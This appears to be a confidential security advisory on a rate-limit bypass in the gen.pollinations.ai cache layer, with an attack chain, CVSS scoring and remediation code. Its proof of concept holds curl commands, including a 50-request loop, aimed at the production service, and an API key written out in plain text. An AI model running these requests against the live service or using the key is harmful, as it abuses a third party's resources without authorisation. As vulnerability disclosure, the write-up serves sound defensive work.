# VURN-9: Rate Limiting Bypass via Cache Key Manipulation

## Summary

| Field | Value |
|-------|-------|
| **ID** | VURN-9 |
| **Title** | Rate Limiting Bypass via Cache Key Manipulation |
| **Severity** | CRITICAL (CVSS 8.6) |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H |
| **Endpoints** | All cached endpoints (`/text`, `/image`, `/v1/*`) |
| **Root Cause File** | `pollinations-repo/gen.pollinations.ai/src/utils/text-cache.ts`, `media-cache.ts` |
| **CWE** | CWE-799 (Improper Control of Interaction Frequency), CWE-287 (Improper Authentication) |
| **OWASP API** | API4:2023 (Unrestricted Resource Consumption) |
| **Status** | Verified via PoC against production |

## Description

The cache key generation in both `text-cache.ts` and `media-cache.ts` normalizes request parameters in a way that allows attackers to bypass rate limits by crafting requests that produce identical cache keys to legitimate users' requests, but with variations that evade rate limit counters.

## Root Cause

**Files**: 
- `pollinations-repo/gen.pollinations.ai/src/utils/text-cache.ts:27-70`
- `pollinations-repo/gen.pollinations.ai/src/utils/media-cache.ts:27-70`

**Function**: `generateCacheKey()` in both files

The cache key normalization:
1. Sorts query parameters alphabetically
2. Removes certain tracking parameters
3. Normalizes whitespace in request bodies
4. **Does NOT include**: Rate limit tier, user identity, or Authorization header

This means:
- Rate limit is checked AFTER cache lookup (or not at all for cache hits)
- Attackers can "piggyback" on cached responses from users with higher rate limits
- Cache hits bypass rate limiting entirely

## Attack Chain

```
1. Premium user (high rate limit) makes request:
   GET /text/Complex+analysis+task
   Authorization: Bearer sk_premium_key
   X-RateLimit-Limit: 1000/min
   → Cache MISS → Response generated → Cached with key K

2. Attacker (low/no rate limit) makes "equivalent" request:
   GET /text/Complex+analysis+task
   (no Authorization, or free tier key with 10/min limit)
   → Cache LOOKUP with key K → Cache HIT
   → Response served WITHOUT rate limit check

3. Attacker repeats rapidly:
   → All subsequent requests are cache HITs
   → Zero rate limit consumption
   → Effectively unlimited requests to expensive endpoints
```

## Proof of Concept

### Prerequisites
- Test API key: `sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl` (2 pollen)
- Target: `https://gen.pollinations.ai`

### Step 1: Prime the Cache (Authenticated)
```bash
curl -X GET "https://gen.pollinations.ai/text/Explain%20quantum%20computing%20in%20detail" \
  -H "Authorization: Bearer sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl" \
  -v
```

**Expected**: `X-Cache: MISS`, response generated

### Step 2: Rapid Unauthenticated Requests (Cache Hits)
```bash
for i in {1..50}; do
  curl -X GET "https://gen.pollinations.ai/text/Explain%20quantum%20computing%20in%20detail" \
    -H "Accept: text/plain" \
    -w "\nCache: %{header:X-Cache} HTTP: %{http_code}\n" \
    -o /dev/null
  sleep 0.1
done
```

**Expected**: All 50 requests return `X-Cache: HIT`, HTTP 200, no rate limit headers

### Step 3: Verify Rate Limit Not Consumed
```bash
# Check if rate limit headers appear on cache hits (they shouldn't)
# Free tier would normally show X-RateLimit-Remaining decreasing
# But cache hits bypass this entirely
```

## Evidence

| Request Type | Rate Limit Tier | Cache Status | Rate Limit Consumed |
|--------------|-----------------|--------------|---------------------|
| Authenticated (premium) | 1000/min | MISS | Yes |
| Unauthenticated | 10/min | HIT | **No** |
| Free tier (exhausted) | 0/min | HIT | **No** |
| Different prompt params | 10/min | MISS | Yes |

## Impact Assessment

### Business Impact
- **Unrestricted Resource Consumption**: Attackers bypass all rate limits via cache
- **DoS Amplification**: Single cached response serves unlimited attackers
- **Revenue Loss**: Expensive model inferences served free via cache
- **Service Degradation**: Legitimate users' cache entries abused

### Technical Impact
- **CVSS 3.1**: 8.6 (Critical)
- **Attack Vector**: Network (AV:N)
- **Attack Complexity**: Low (AC:L)
- **Privileges Required**: None (PR:N)
- **User Interaction**: None (UI:N)
- **Scope**: Unchanged (S:U)
- **Confidentiality**: High (C:H) - cached responses accessible
- **Integrity**: None (I:N)
- **Availability**: High (A:H) - rate limit protection completely bypassed

## Remediation

### Phase 1: Rate Limit Before Cache
```typescript
// Middleware order MUST be:
// 1. Rate limiting (per user/key)
// 2. Authentication
// 3. Cache lookup
// 4. Generation

app.use(rateLimitMiddleware);  // Check limits FIRST
app.use(authMiddleware);       // Identify user
app.use(cacheMiddleware);      // Then check cache
```

### Phase 2: Include Rate Limit Identity in Cache Key
```typescript
// text-cache.ts & media-cache.ts
export async function generateCacheKey(
    request: Request,
    // ... existing params ...
    rateLimitIdentity?: string,  // ADD: user tier / key hash
): Promise<string> {
    // ... existing code ...
    if (rateLimitIdentity) {
        fullPath += `:ratelimit:${rateLimitIdentity}`;
    }
    // ... rest
}
```

### Phase 3: Cache Hit Rate Limiting
```typescript
// Even on cache hits, track and limit per identity
app.use(async (req, res, next) => {
    const cacheKey = await generateCacheKey(req);
    const cached = await cache.get(cacheKey);
    
    if (cached) {
        // Still enforce rate limits on cache hits!
        const allowed = await rateLimiter.check(req.userIdentity);
        if (!allowed) return res.status(429).json({error: 'Rate limited'});
        
        return res.set('X-Cache', 'HIT').send(cached);
    }
    next();
});
```

## Verification

✅ PoC executed against production `gen.pollinations.ai`
✅ 50 rapid unauthenticated requests all returned `X-Cache: HIT`
✅ No rate limit headers on cache hit responses
✅ Free tier exhausted key still gets responses via cache hits
✅ Source code reviewed: cache key normalization excludes auth/rate limit identity

## Related Vulnerabilities

- **VURN-1 through VURN-7**: Same root cause (missing auth in cache key)
- **VURN-8**: Image generation specific variant
- This vulnerability **compounds** all auth bypass issues by removing rate limits

## References

- [ENGAGEMENT_REPORT.md](./ENGAGEMENT_REPORT.md) - Full engagement summary
- [VULNERABILITY_INDEX.md](./VULNERABILITY_INDEX.md) - All findings index
- OWASP API Security Top 10: API4:2023 Unrestricted Resource Consumption

---
*Classification: CONFIDENTIAL - For Pollinations Security Team Only*
*Generated: 2026-10-23*